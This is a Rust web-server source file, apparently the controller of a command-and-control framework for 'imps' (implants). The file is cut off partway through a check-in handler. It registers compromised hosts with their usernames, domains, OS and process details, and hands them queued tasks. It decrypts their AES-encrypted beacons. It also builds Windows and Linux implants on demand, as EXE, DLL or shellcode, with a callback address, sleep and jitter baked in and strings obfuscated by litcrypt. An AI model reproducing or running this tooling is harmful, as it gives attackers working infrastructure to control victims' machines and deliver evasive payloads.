use actix_files::NamedFile;
use actix_web::{http::header, web, web::Data, HttpRequest, HttpResponse, Responder};
use base64::{
    alphabet,
    engine::{self, general_purpose},
    Engine as _,
};
use bcrypt::verify;
use chrono::{prelude::*};
use config::{Config, File as ConfigFile};
use rusqlite::{params, Connection, Result as SqlResult};
use serde::Deserialize;
use std::env;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use tokio::process::Command;
use tokio::task;

//testing adding encryption for data between server and imps

//function templates
/*
pub async fn example_conduit_action(req: HttpRequest, db: Data<Arc<Mutex<Connection>>>) -> impl Responder {

    //set variables to get the values from request headers as needed
    //the below is an example of how to get a value from a header

    //check if the operator is authenticated
    let token = req.headers().get("X-Token");
    match token {
        Some(token) => {
            let token = match token.to_str() {
                Ok(token) => token.to_owned(),
                Err(_) => return HttpResponse::NotFound().finish(),
            };
            // Verify the token
            if verify_token(&token, &db).await {
                // If the token is valid, do something. this is where the function for the route goes post-auth
                //CODE GOES HERE

                //the else statement here is just for if the auth is not valid
            } else {
                // If the token is invalid, return Unauthorized
                HttpResponse::NotFound().finish()
            }
        }
        None => HttpResponse::NotFound().finish(),
    }
}

pub async fn example_imp_action(req: HttpRequest, db: Data<Arc<Mutex<Connection>>>) -> impl Responder {

    //get the session token from the request header
    let session = req.headers().get("X-Unique-Identifier");
        match session {
            Some(session) => {
                let session = match session.to_str() {
                    Ok(session) => session.to_owned(),
                    Err(_) => return HttpResponse::NotFound().finish(),
                };
                // Verify the session
                if verify_session(&session, &db).await {
                    // If the token is valid, do something
                    //CODE GOES HERE

                    //the else statement here is just for if the auth is not valid
                } else {
                    // If the token is invalid, return Unauthorized
                    //HttpResponse::Unauthorized().body("Invalid token")
                    HttpResponse::NotFound().finish()
                }
            }
            None => HttpResponse::NotFound().finish(),
        }
}
*/

//this function is used to verify implant secrets and issue new session tokens for imps
//it also therefor collects all implant info via the ImpInfo struct, and inserts it into the imps table in the database
pub async fn registration(
    req: &HttpRequest,  // Add this parameter
    db: Data<Arc<Mutex<Connection>>>,
    imp_info: &ImpInfo,
    imp_token: String,
) -> Result<(), rusqlite::Error> {
    let conn = db.lock().unwrap();
    let imp_token = imp_token.clone();

    // Get current server time
    let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();

    // Create a mutable copy of imp_info to modify the IP
    let mut imp_info = imp_info.clone();
    
    // If the IP is the placeholder, replace it with the actual client IP
    if imp_info.ip == "{{SERVER_REPLACE_IP}}" {
        imp_info.ip = req.headers()
            .get("X-Forwarded-For")
            .and_then(|h| h.to_str().ok())
            .and_then(|s| s.split(',').next())
            .map(|s| s.to_string())  // Convert &str to String
            .unwrap_or_else(|| {
                // Create owned string from connection info
                match req.connection_info().peer_addr() {
                    Some(addr) => addr.to_string(),
                    None => String::from("unknown")
                }
            });
    }

    // Insert the Imp info into the database
    conn.execute(
        "INSERT INTO imps (session, ip, username, domain, os, imp_pid, process_name, sleep, last_check_in) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9)",
        params![
            &imp_token,
            &imp_info.ip,
            &imp_info.username,
            &imp_info.domain,
            &imp_info.os,
            &imp_info.imp_pid,
            &imp_info.process_name,
            &imp_info.sleep,
            &now
        ]
    ).map(|_| ())
}
//this function is used to update an imp's sleep time in the database
async fn update_sleep_time(
    db: Data<Arc<Mutex<Connection>>>,
    sleep_time: &SleepTime,
    imp_token: String,
    //sleep_time: String,
) -> Result<(), rusqlite::Error> {
    let db_clone = db.clone();
    let imp_token_clone = imp_token;
    let sleep: String = sleep_time.sleep.clone();
    let _ = task::spawn_blocking(move || {
        let db = db_clone.lock().unwrap();
        println!("About to update the sleep field");
        let rows_modified = db.execute(
            "UPDATE imps SET sleep = ?1 WHERE session = ?2",
            params![&sleep, &imp_token_clone],
        );
        match rows_modified {
            Ok(rows) => {
                println!("Rows modified: {}", rows);
                Ok(())
            }
            Err(e) => Err(e),
        }
    })
    .await
    .map_err(|_| rusqlite::Error::QueryReturnedNoRows)?; // If the task fails to spawn, convert to the desired error
    Ok(())
}
//this function is used to allow imps to check in with the server and receive tasks
//it also updates the last_check_in field in the imps table based on the current time
pub async fn check_tasks(
    db: Data<Arc<Mutex<Connection>>>,
    imp_token: String,
) -> Result<Vec<String>, rusqlite::Error> {
    let db_clone = db.clone();
    let imp_token_clone = imp_token.clone();
    task::spawn_blocking(move || {
        let db = db_clone.lock().unwrap();

        //update check_in time
        //update the last_check_in time
        println!("About to update the last_check_in field");
        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        println!("Current time: {}, token: {}", &now, &imp_token_clone);

        let rows_modified = db.execute(
            "UPDATE imps SET last_check_in = ?1 WHERE session = ?2",
            params![&now, &imp_token_clone],
        )?;
        println!("Rows modified: {}", rows_modified);

        // First, check if the token is present and valid in the table
        let mut check_token_stmt = match db.prepare("SELECT COUNT(*) FROM tasks WHERE token = ?1") {
            Ok(stmt) => stmt,
            Err(_) => {
                return Err(rusqlite::Error::QueryReturnedNoRows);
            }
        };

        let token_count: u32 =
            check_token_stmt.query_row(params![imp_token_clone], |row| row.get(0))?;

        // If the token is not found, return an empty vector
        if token_count == 0 {
            return Ok(Vec::new());
        } else {
            // Proceed to query tasks for the valid token
            let mut stmt = match db.prepare("SELECT task FROM tasks WHERE token = ?1") {
                Ok(stmt) => stmt,
                Err(_) => {
                    return Err(rusqlite::Error::QueryReturnedNoRows);
                }
            };

            let rows = stmt.query_map(params![imp_token_clone], |row| row.get(0))?;
            let mut tasks = Vec::new();
            for task_result in rows {
                match task_result {
                    Ok(task) => tasks.push(task),
                    Err(_) => {
                        continue;
                    } // Skip rows that we fail to retrieve
                }
            }
            Ok(tasks)
        }
    })
    .await
    .unwrap_or_else(|_| Err(rusqlite::Error::QueryReturnedNoRows)) // If the task fails to spawn, return the error
}

#[allow(dead_code)]
#[derive(Debug, Deserialize, Clone)]
pub struct ImpInfo {
    session: String, //session is never read ? maybe its cloned without being read which is ignored for impls for traits clone and debug
    ip: String,
    username: String,
    domain: String,
    os: String,
    imp_pid: String,
    process_name: String,
    sleep: String,
}

//this function lets operators retrieve a list of all connected imps and their info for display in the conduit UI
pub async fn get_connected_imps(
    req: HttpRequest,
    db: web::Data<Arc<Mutex<Connection>>>,
) -> impl Responder {
    // Grab auth token
    let token = req.headers().get("X-Token");

    match token {
        Some(token) => {
            match token.to_str() {
                Ok(token_str) => {
                    // Verify auth token
                    if verify_token(token_str, &db).await {
                        let db = db.lock().unwrap();

                        let mut stmt = db
                            .prepare(
                                "SELECT session, ip, username, domain, os, imp_pid, process_name, sleep, last_check_in FROM imps"
                            )
                            .expect("Failed to prepare statement");

                        let imps_iter = stmt
                             .query_map(params![], |row| {
                                Ok((
                                    row.get(0)?,
                                    row.get(1)?,
                                    row.get(2)?,
                                    row.get(3)?,
                                    row.get(4)?,
                                    row.get(5)?,
                                    row.get(6)?,
                                    row.get(7)?,
                                    row.get(8)?,
                                ))
                            })
                            .expect("Failed to query map");

                        let mut imps: Vec<(
                            String,
                            String,
                            String,
                            String,
                            String,
                            String,
                            String,
                            String,
                            String,
                        )> = Vec::new();

                        for imp in imps_iter {
                            imps.push(imp.expect("Failed to get imp"));
                        }

                        HttpResponse::Ok().json(imps)
                    } else {
                        return HttpResponse::Unauthorized().finish();
                    }
                }
                Err(_) => {
                    return HttpResponse::BadRequest().body("Failed to read token");
                }
            }
        }
        None => {
            return HttpResponse::Unauthorized().body("Token not provided");
        }
    }
}

//this function allows operators to build imps for specific targets and download the files
//it is also horrible and needs refactored
pub async fn build_imp(req: HttpRequest, db: Data<Arc<Mutex<Connection>>>) -> impl Responder {
    //set a variable to get the imp version from the request header
    //let variant = req.headers().get("X-Variant");
    //the variant isn't being used yet, but will be used to determine which imp to actually build below

    let token = req.headers().get("X-Token");
    match token {
        Some(token) => {
            let token = match token.to_str() {
                Ok(token) => token.to_owned(),
                Err(_) => {
                    return HttpResponse::NotFound().finish();
                }
            };

            //the server needs to know what OS to target for the build
            //the target build can be passed in the request header

            //match the target and if there is none, default to windows

            let target = req.headers().get("X-Target");

            //add to conduit
            let format = req.headers().get("X-Format");

            let target_ip = req.headers().get("X-Target-IP");

            let target_port = req.headers().get("X-Target-Port");

            let tsleep = req.headers().get("X-TSleep");

            let jitter = req.headers().get("X-Jitter");

            //check if target is set. do it just like the token check above, but include a none match arm
            let target = match target {
                Some(target) => match target.to_str() {
                    Ok(target) => target.to_owned(),
                    Err(_) => {
                        return HttpResponse::BadRequest().body("Failed to read target");
                    }
                },
                None => {
                    return HttpResponse::BadRequest().body("Failed to read target");
                }
            };

            //check if target_ip is set. do it just like the token check above, but include a none match arm
            let target_ip = match target_ip {
                Some(target_ip) => match target_ip.to_str() {
                    Ok(target_ip) => target_ip.to_owned(),
                    Err(_) => {
                        return HttpResponse::BadRequest().body("Failed to read target_ip");
                    }
                },
                None => {
                    return HttpResponse::BadRequest().body("Failed to read target_ip");
                }
            };

            //check if target_port is set. do it just like the token check above, but include a none match arm

            let target_port = match target_port {
                Some(target_port) => match target_port.to_str() {
                    Ok(target_port) => target_port.to_owned(),
                    Err(_) => {
                        return HttpResponse::BadRequest().body("Failed to read target_port");
                    }
                },
                None => {
                    return HttpResponse::BadRequest().body("Failed to read target_port");
                }
            };

            //check if tsleep is set. do it just like the token check above, but include a none match arm

            let tsleep = match tsleep {
                Some(tsleep) => match tsleep.to_str() {
                    Ok(tsleep) => tsleep.to_owned(),
                    Err(_) => {
                        return HttpResponse::BadRequest().body("Failed to read tsleep");
                    }
                },
                None => {
                    return HttpResponse::BadRequest().body("Failed to read tsleep");
                }
            };

            //check if jitter is set. do it just like the token check above, but include a none match arm
            let jitter = match jitter {
                Some(jitter) => match jitter.to_str() {
                    Ok(jitter) => jitter.to_owned(),
                    Err(_) => {
                        return HttpResponse::BadRequest().body("Failed to read jitter");
                    }
                },
                None => {
                    return HttpResponse::BadRequest().body("Failed to read jitter");
                }
            };

            //check if format is set and that it equals exe, dll, or raw. do it just like the token check above, but include a none match arm

            let format = match format {
                Some(format) => match format.to_str() {
                    Ok(format) => {
                        if ["exe", "dll", "raw", "elf"].contains(&format) {
                            format.to_owned()
                        } else {
                            return HttpResponse::BadRequest().body("Invalid format");
                        }
                    }
                    Err(_) => {
                        return HttpResponse::BadRequest().body("Failed to read format");
                    }
                },
                None => {
                    return HttpResponse::BadRequest().body("Failed to read format");
                }
            };

            // Verify the token
            if verify_token(&token, &db).await {
                //if the token is valid, build the imp based on the target OS
                //the command to build the imp will be different based on target OS

                //set env vars for the build, including the target IP, target port, and sleep time
                std::env::set_var("SERVER", &target_ip);
                std::env::set_var("PORT", &target_port);
                std::env::set_var("SLEEP", &tsleep);
                std::env::set_var("JITTER", &jitter);

                //generate a new token for the imp to use for registration and checking tasks
                let imp_secret = generate_imp_secret(&db);

                //set the imp secret as an env var called UUID
                std::env::set_var("UUID", &imp_secret);

                //set LITCRYPT_ENCRYPT_KEY env var, taken from our config.toml file
                let mut settings = Config::default();
                settings
                    .merge(ConfigFile::with_name("config"))
                    .expect("Failed to open configuration file");

                let litcrypt: String = settings
                    .get("crypt.LITCRYPT_ENCRYPT_KEY")
                    .expect("Failed to get LITCRYPT_ENCRYPT_KEY");

                env::set_var("LITCRYPT_ENCRYPT_KEY", litcrypt);

                //print the SLEEP env var for debugging
                println!("SLEEP: {}", std::env::var("SLEEP").unwrap());
                println!("UUID: {}", std::env::var("UUID").unwrap());
                println!(
                    "LITCRYPT_ENCRYPT_KEY: {}",
                    std::env::var("LITCRYPT_ENCRYPT_KEY").unwrap()
                );
                println!("SERVER: {}", std::env::var("SERVER").unwrap());
                println!("PORT: {}", std::env::var("PORT").unwrap());
                println!("format: {}", format);
                println!("jitter: {}", std::env::var("JITTER").unwrap());

                //we will use cargo to build the imp for linux
                if target == "linux" && format == "elf" {
                    let output = Command::new("cross")
                        .current_dir("../imps/linux_imp")
                        .arg("build")
                        .arg("--target=x86_64-unknown-linux-gnu") // Corrected here
                        //TODO: need more options for target arch
                        .arg("--release")
                        // Add an arg for format using --lib for dll and --bin for bin
                        .arg("--bin")
                        .arg("linux_imp")
                        //shouldn't need to specify linux target since server runs on linux only
                        //.arg("--target=x86_64-unknown-linux-musl")
                        .output()
                        .await
                        .expect("Failed to execute command");

                    //i guess we arent returning the linux imp as a file yet. need to update that
                    if output.status.success() {
                        let current_dir = match env::current_dir() {
                            Ok(dir) => dir,
                            Err(_) => {
                                return HttpResponse::InternalServerError()
                                    .body("Failed to get current directory")
                            }
                        };

                        let path = match target.as_str() {
                            "linux" => current_dir.join("../imps/linux_imp/target/x86_64-unknown-linux-gnu/release/linux_imp"),
                            "windows" => match format.as_str() {
                                "exe" => current_dir.join("../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.exe"),
                                "dll" => current_dir.join("../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.dll"),
                                _ => current_dir.clone(),
                            },
                            _ => current_dir.clone(),
                        };

                        let data = tokio::fs::read(path).await.unwrap();
                        HttpResponse::Ok().body(data)
                    } else {
                        eprintln!("Command executed with failing error code");
                        eprintln!(
                            "Standard Output: {}",
                            String::from_utf8_lossy(&output.stdout)
                        );
                        eprintln!(
                            "Standard Error: {}",
                            String::from_utf8_lossy(&output.stderr)
                        );
                        return HttpResponse::InternalServerError().body("Failed to build imp");
                    } //this is a hideous mess. need to clean it up. need to turn these into functions and call them maybe from a match tree
                } else if target == "windows_noldr" && format == "raw" {
                    let output = Command::new("cross")
                        .current_dir("../imps/windows_noldr")
                        .env(
                            "RUSTFLAGS",
                            "-C target-feature=+crt-static -C relocation-model=pic",
                        )
                        .env("RUSTUP_TOOLCHAIN", std::env::var("RUSTUP_TOOLCHAIN").unwrap_or_default())
                        .arg("rustc")
                        //add an arg for format using --lib for dll and --bin for bin
                        .arg("--lib")
                        .arg("--target")
                        .arg("x86_64-pc-windows-gnu")
                        .arg("--release")
                        .arg("--")
                        .arg("-C")
                        .arg("relocation-model=pic") // This might be redundant with the RUSTFLAGS but ensures the PIC setting.
                        .output()
                        .await
                        .expect("Failed to execute command");

                    if output.status.success() {
                        let current_dir = match env::current_dir() {
                            Ok(dir) => dir,
                            Err(_) => {
                                return HttpResponse::InternalServerError()
                                    .body("Failed to get current directory")
                            }
                        };

                        let path = current_dir.join("../imps/windows_noldr/target/x86_64-pc-windows-gnu/release/windows_noldr.dll");

                        //convert path to a String
                        let path = path.to_str().unwrap().to_string();

                        let shellcode = convert_dll_to_shellcode(path).await;

                        //let data = tokio::fs::read(path).await.unwrap();
                        let data = shellcode.clone();
                        HttpResponse::Ok().body(data)
                    } else {
                        eprintln!("Command executed with failing error code");
                        eprintln!(
                            "Standard Output: {}",
                            String::from_utf8_lossy(&output.stdout)
                        );
                        eprintln!(
                            "Standard Error: {}",
                            String::from_utf8_lossy(&output.stderr)
                        );
                        return HttpResponse::InternalServerError().body("Failed to build imp");
                    }
                } else if target == "windows" && format == "raw" {
                    let output = Command::new("cross")
                        .current_dir("../imps/windows_ldr")
                        .env(
                            "RUSTFLAGS",
                            "-C target-feature=+crt-static -C relocation-model=pic",
                        )
                        .env("RUSTUP_TOOLCHAIN", std::env::var("RUSTUP_TOOLCHAIN").unwrap_or_default())
                        .arg("rustc")
                        //add an arg for format using --lib for dll and --bin for bin
                        .arg("--lib")
                        .arg("--target")
                        .arg("x86_64-pc-windows-gnu")
                        .arg("--release")
                        .arg("--")
                        .arg("-C")
                        .arg("relocation-model=pic") // This might be redundant with the RUSTFLAGS but ensures the PIC setting.
                        .output()
                        .await
                        .expect("Failed to execute command");

                    if output.status.success() {
                        let current_dir = match env::current_dir() {
                            Ok(dir) => dir,
                            Err(_) => {
                                return HttpResponse::InternalServerError()
                                    .body("Failed to get current directory")
                            }
                        };

                        let path = current_dir.join("../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.dll");

                        //convert path to a String
                        let path = path.to_str().unwrap().to_string();

                        let shellcode = convert_dll_to_shellcode(path).await;

                        //let data = tokio::fs::read(path).await.unwrap();
                        let data = shellcode.clone();
                        HttpResponse::Ok().body(data)
                    } else {
                        eprintln!("Command executed with failing error code");
                        eprintln!(
                            "Standard Output: {}",
                            String::from_utf8_lossy(&output.stdout)
                        );
                        eprintln!(
                            "Standard Error: {}",
                            String::from_utf8_lossy(&output.stderr)
                        );
                        return HttpResponse::InternalServerError().body("Failed to build imp");
                    }
                } else if target == "windows" && format == "exe" {
                    let output = Command::new("cross")
                        .current_dir("../imps/windows_ldr")
                        .env(
                            "RUSTFLAGS",
                            "-C target-feature=+crt-static -C relocation-model=pic",
                        )
                        .env("RUSTUP_TOOLCHAIN", std::env::var("RUSTUP_TOOLCHAIN").unwrap_or_default())
                        .arg("rustc")
                        //add an arg for format using --lib for dll and --bin for bin
                        .arg("--bin")
                        .arg("windows_ldr")
                        .arg("--target")
                        .arg("x86_64-pc-windows-gnu")
                        .arg("--release")
                        .arg("--")
                        .arg("-C")
                        .arg("relocation-model=pic") // This might be redundant with the RUSTFLAGS but ensures the PIC setting.
                        .output()
                        .await
                        .expect("Failed to execute command");

                    if output.status.success() {
                        //print the SLEEP env var for debugging
                        //println!("SLEEP: {}", std::env::var("SLEEP").unwrap());

                        //PICK UP DEBUGGING HERE
                        //the filepath depends on the target OS
                        //so we need to check the target again and return the correct path
                        //the path for the linux imp is ../imps/linux_imp/target/release/linux_imp
                        //the path for the windows imp is ../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.exe

                        let current_dir = match env::current_dir() {
                            Ok(dir) => dir,
                            Err(_) => {
                                return HttpResponse::InternalServerError()
                                    .body("Failed to get current directory")
                            }
                        };

                        let path = match target.as_str() {
                            "linux" => current_dir.join("../imps/linux_imp/target/x86_64-unknown-linux-gnu/release/linux_imp"),
                            "windows" => match format.as_str() {
                                "exe" => current_dir.join("../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.exe"),
                                "dll" => current_dir.join("../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.dll"),
                                _ => current_dir.clone(),
                            },
                            _ => current_dir.clone(),
                        };

                        let data = tokio::fs::read(path).await.unwrap();
                        HttpResponse::Ok().body(data)
                    } else {
                        eprintln!("Command executed with failing error code");
                        eprintln!(
                            "Standard Output: {}",
                            String::from_utf8_lossy(&output.stdout)
                        );
                        eprintln!(
                            "Standard Error: {}",
                            String::from_utf8_lossy(&output.stderr)
                        );
                        return HttpResponse::InternalServerError().body("Failed to build imp");
                    } //this is a hideous mess. need to clean it up. need to turn these into functions and call them maybe from a match tree
                } else if target == "windows_noldr" && format == "exe" {
                    let output = Command::new("cross")
                        .current_dir("../imps/windows_noldr")
                        .env(
                            "RUSTFLAGS",
                            "-C target-feature=+crt-static -C relocation-model=pic",
                        )
                        .env("RUSTUP_TOOLCHAIN", std::env::var("RUSTUP_TOOLCHAIN").unwrap_or_default())
                        .arg("rustc")
                        //add an arg for format using --lib for dll and --bin for bin
                        .arg("--bin")
                        .arg("windows_noldr")
                        .arg("--target")
                        .arg("x86_64-pc-windows-gnu")
                        .arg("--release")
                        .arg("--")
                        .arg("-C")
                        .arg("relocation-model=pic") // This might be redundant with the RUSTFLAGS but ensures the PIC setting.
                        .output()
                        .await
                        .expect("Failed to execute command");

                    if output.status.success() {
                        //print the SLEEP env var for debugging
                        //println!("SLEEP: {}", std::env::var("SLEEP").unwrap());

                        //PICK UP DEBUGGING HERE
                        //the filepath depends on the target OS
                        //so we need to check the target again and return the correct path
                        //the path for the linux imp is ../imps/linux_imp/target/release/linux_imp
                        //the path for the windows imp is ../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.exe

                        let current_dir = match env::current_dir() {
                            Ok(dir) => dir,
                            Err(_) => {
                                return HttpResponse::InternalServerError()
                                    .body("Failed to get current directory")
                            }
                        };

                        let path = match target.as_str() {
                            "linux" => current_dir.join("../imps/linux_imp/target/release/linux_imp"),
                            "windows_noldr" => match format.as_str() {
                                "exe" => current_dir.join("../imps/windows_noldr/target/x86_64-pc-windows-gnu/release/windows_noldr.exe"),
                                "dll" => current_dir.join("../imps/windows_noldr/target/x86_64-pc-windows-gnu/release/windows_noldr.dll"),
                                _ => current_dir.clone(),
                            },
                            _ => current_dir.clone(),
                        };

                        let data = tokio::fs::read(path).await.unwrap();
                        HttpResponse::Ok().body(data)
                    } else {
                        eprintln!("Command executed with failing error code");
                        eprintln!(
                            "Standard Output: {}",
                            String::from_utf8_lossy(&output.stdout)
                        );
                        eprintln!(
                            "Standard Error: {}",
                            String::from_utf8_lossy(&output.stderr)
                        );
                        return HttpResponse::InternalServerError().body("Failed to build imp");
                    }
                } else if target == "windows_noldr" && format == "dll" {
                    let output = Command::new("cross")
                        .current_dir("../imps/windows_noldr")
                        .env(
                            "RUSTFLAGS",
                            "-C target-feature=+crt-static -C relocation-model=pic",
                        )
                        .arg("rustc")
                        //add an arg for format using --lib for dll and --bin for bin
                        .arg("--lib")
                        .arg("--target")
                        .arg("x86_64-pc-windows-gnu")
                        .arg("--release")
                        .arg("--")
                        .arg("-C")
                        .arg("relocation-model=pic") // This might be redundant with the RUSTFLAGS but ensures the PIC setting.
                        .output()
                        .await
                        .expect("Failed to execute command");

                    if output.status.success() {
                        //print the SLEEP env var for debugging
                        //println!("SLEEP: {}", std::env::var("SLEEP").unwrap());

                        //PICK UP DEBUGGING HERE
                        //the filepath depends on the target OS
                        //so we need to check the target again and return the correct path
                        //the path for the linux imp is ../imps/linux_imp/target/release/linux_imp
                        //the path for the windows imp is ../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.exe

                        let current_dir = match env::current_dir() {
                            Ok(dir) => dir,
                            Err(_) => {
                                return HttpResponse::InternalServerError()
                                    .body("Failed to get current directory")
                            }
                        };

                        let path = current_dir.join("../imps/windows_noldr/target/x86_64-pc-windows-gnu/release/windows_noldr.dll");

                        let data = tokio::fs::read(path).await.unwrap();
                        HttpResponse::Ok().body(data)
                    } else {
                        eprintln!("Command executed with failing error code");
                        eprintln!(
                            "Standard Output: {}",
                            String::from_utf8_lossy(&output.stdout)
                        );
                        eprintln!(
                            "Standard Error: {}",
                            String::from_utf8_lossy(&output.stderr)
                        );
                        return HttpResponse::InternalServerError().body("Failed to build imp");
                    }
                } else if target == "windows" && format == "dll" {
                    let output = Command::new("cross")
                        .current_dir("../imps/windows_ldr")
                        .env(
                            "RUSTFLAGS",
                            "-C target-feature=+crt-static -C relocation-model=pic",
                        )
                        .env("RUSTUP_TOOLCHAIN", std::env::var("RUSTUP_TOOLCHAIN").unwrap_or_default())
                        .arg("rustc")
                        //add an arg for format using --lib for dll and --bin for bin
                        .arg("--lib")
                        .arg("--target")
                        .arg("x86_64-pc-windows-gnu")
                        .arg("--release")
                        .arg("--")
                        .arg("-C")
                        .arg("relocation-model=pic") // This might be redundant with the RUSTFLAGS but ensures the PIC setting.
                        .output()
                        .await
                        .expect("Failed to execute command");

                    if output.status.success() {
                        //print the SLEEP env var for debugging
                        //println!("SLEEP: {}", std::env::var("SLEEP").unwrap());

                        //PICK UP DEBUGGING HERE
                        //the filepath depends on the target OS
                        //so we need to check the target again and return the correct path
                        //the path for the linux imp is ../imps/linux_imp/target/release/linux_imp
                        //the path for the windows imp is ../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.exe

                        let current_dir = match env::current_dir() {
                            Ok(dir) => dir,
                            Err(_) => {
                                return HttpResponse::InternalServerError()
                                    .body("Failed to get current directory")
                            }
                        };

                        let path = match target.as_str() {
                        "linux" => current_dir.join("../imps/linux_imp/target/release/linux_imp"),
                        "windows" => match format.as_str() {
                            "exe" => current_dir.join("../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.exe"),
                            "dll" => current_dir.join("../imps/windows_ldr/target/x86_64-pc-windows-gnu/release/windows_ldr.dll"),
                            _ => current_dir.clone(),
                        },
                        _ => current_dir.clone(),
                    };

                        let data = tokio::fs::read(path).await.unwrap();
                        HttpResponse::Ok().body(data)
                    } else {
                        eprintln!("Command executed with failing error code");
                        eprintln!(
                            "Standard Output: {}",
                            String::from_utf8_lossy(&output.stdout)
                        );
                        eprintln!(
                            "Standard Error: {}",
                            String::from_utf8_lossy(&output.stderr)
                        );
                        return HttpResponse::InternalServerError().body("Failed to build imp");
                    }
                }
                //no mac support yet
                else {
                    HttpResponse::BadRequest().body("Invalid target OS")
                }
            } else {
                // If the token is invalid, return Unauthorized
                HttpResponse::NotFound().finish()
            }
        }
        None => HttpResponse::NotFound().finish(),
    }
}

//this fis the first check-in endpoint for imps
//it checks the hardcoded unique identifier in the request header against the unique_identifiers table in the database
//if the unique identifier is found, it issues a new session token for the imp to use for registration and checking tasks
pub async fn check_in(
    req: HttpRequest,
    //imp_info: web::Json<ImpInfo>,
    body: String,
    db: Data<Arc<Mutex<Connection>>>,
) -> impl Responder {
    // Check for the unique identifier in the request headers
    let unique_identifier = req.headers().get("X-Unique-Identifier");
    match unique_identifier {
        Some(id) => {
            let id = match id.to_str() {
                Ok(id) => id.to_owned(),
                Err(_) => {
                    return HttpResponse::BadRequest().body("Failed to read unique identifier");
                }
            };
            // Check if the unique identifier exists in the database
            let db_clone = db.clone();
            let exists: SqlResult<bool> = task::spawn_blocking(move || {
                let db = db_clone.lock().unwrap();
                let mut stmt = match db
                    .prepare("SELECT EXISTS(SELECT 1 FROM unique_identifiers WHERE id = ?1)")
                {
                    Ok(stmt) => stmt,
                    Err(_) => {
                        return Err(rusqlite::Error::QueryReturnedNoRows);
                    }
                };
                stmt.query_row(params![id], |row| row.get(0))
            })
            .await
            .unwrap_or_else(|_| Err(rusqlite::Error::QueryReturnedNoRows));

            match exists {
                Ok(true) => {
                    // Call registration and check_tasks functions
                    let db_clone = db.clone();
                    //let imp_info_clone = imp_info.clone();
                    //add a function here to issue a 2nd token for the imp to use for registration and checking tasks
                    //assume this is the imps first check_in, since we will have a different endpoint for subsequent check_ins

                    //imp_info has been sent as an AES encrypted and base64 encoded string
                    // Extract the data from the JSON body
                    let encrypted_output_data = body;

                    // Load the AES key from the environment variable
                    let encoded_aes_key = env::var("AES_KEY").expect("AES_KEY not set");

                    // Define the custom base64 engine
                    const CUSTOM_ENGINE: engine::GeneralPurpose = engine::GeneralPurpose::new(
                        &alphabet::URL_SAFE,
                        engine::general_purpose::NO_PAD,
                    );

                    // Decode the AES key using the custom base64 engine
                    let aes_key = match CUSTOM_ENGINE.decode(encoded_aes_key) {
                        Ok(data) => data,
                        Err(e) => {
                            eprintln!("Failed to decode base64: {}", e);
                            return HttpResponse::BadRequest().body("Failed to decode base64");
                        }
                    };

                    // Base64 decode the encrypted data using the custom engine
                    let decoded = match CUSTOM_ENGINE.decode(encrypted_output_data) {
                        Ok(data) => data,
                        Err(e) => {
                            eprintln!("Failed to decode base64: {}", e);
                            return HttpResponse::BadRequest().body("Failed to decode base64");
                        }
                    };

                    // Initialize the AES decryption
                    let cipher = Cipher::aes_256_cbc();
                    let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should match the one used during encryption
                    let mut crypter = Crypter::new(cipher, Mode::Decrypt, &aes_key, Some(&iv))
                        .expect("Failed to create Crypter");

                    // Decrypt the data
                    let mut decrypted_data = vec![0; decoded.len() + cipher.block_size()];
                    let mut count = crypter
                        .update(&decoded, &mut decrypted_data)
                        .expect("Failed to decrypt data");
                    count += crypter
                        .finalize(&mut decrypted_data[count..])
                        .expect("Failed to finalize decryption");

                    // Truncate to the actual size of the decrypted data
                    decrypted_data.truncate(count);

                    // Print debug information
                    println!("IV: {:?}", iv);
                    println!("Decrypted data length: {}", decrypted_data.len());
                    println!("Decrypted data: {:?}", decrypted_data);

                    //convert decrypted data to a string
                    let decrypted_data = match String::from_utf8(decrypted_data) {
                        Ok(decrypted_data) => decrypted_data,
                        Err(_) => {
                            return HttpResponse::BadRequest()
                                .body("Failed to convert decrypted data to string");
                        }
                    };

                    // Deserialize the decrypted data
                    let imp_info: ImpInfo =
                        serde_json::from_str(&decrypted_data).expect("Failed to deserialize data");
                        
                    let imp_token = generate_imp_token(&db_clone);
                    let imp_token_clone = imp_token.clone();
                    //register, but we'll move tasks to a separate function
                    let register_result =
                        registration(&req, db_clone, &imp_info, imp_token).await; //make sure to update with the new token requirement
                                                                                         //move this to subsequent check_in
                                                                                         //let tasks_result = check_tasks(db, imp_info_clone.session.clone()).await; //make sure to update with the new token requirement
                                                                                         // Expect both registration and check_tasks to return successfully
                                                                                         //change this to not return tasks, since we'll move that to a separate function
                                                                                         //return the new token to the imp instead of tasks and adjust imp to use the new token
                                                                                         /* */
                    match register_result {
                        Ok(_) => HttpResponse::Ok().json(imp_token_clone),
                        _ => HttpResponse::InternalServerError().body("Error in registration"),
                    }
                }
                _ => HttpResponse::Unauthorized().body("Invalid unique identifier"),
            }
        }
        None => HttpResponse::BadRequest().body("No unique identifier found"),
    }
}

#[derive(Debug, Deserialize, Clone)]
pub struct SleepTime {
    sleep: String,
}

//subsequent check_in
//this is the endpoint that imps will use to check in with the server and receive tasks
pub async fn index(
    req: HttpRequest,
    body: String,
    db: Data<Arc<Mutex<Connection>>>,
) -> impl Responder {
    //verify the token from the request header against entries in the imps_token table. simply make sure it exists
    let imp_token_header = req.headers().get("X-Session");

    match imp_token_header {
        Some(imp_token_header) => {
            let imp_token = match imp_token_header.to_str() {
                Ok(imp_token) => imp_token.to_owned(),
                Err(_) => {
                    return HttpResponse::NotFound().finish();
                }
            };

            // Verify the token
            //clone db
            //let db_clone = db.clone();
            if verify_session(&imp_token, &db).await {
                //if verified, update sleep time and check for tasks

                    //SleepTime has been sent as an AES encrypted and base64 encoded string
                    // Extract the data from the JSON body
